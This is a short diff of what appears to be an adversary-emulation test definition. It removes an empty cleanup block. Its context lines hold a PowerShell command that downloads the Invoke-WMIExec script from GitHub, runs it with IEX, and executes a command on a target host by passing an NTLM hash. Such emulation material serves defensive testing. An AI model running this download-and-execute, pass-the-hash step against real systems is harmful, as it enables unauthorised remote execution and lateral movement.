@@ -35,6 +35,3 @@ steps:
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target {{.Args.target}} -Username {{.Args.user_name}} -Hash {{.Args.ntlm}} -Command {{.Args.command}}
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
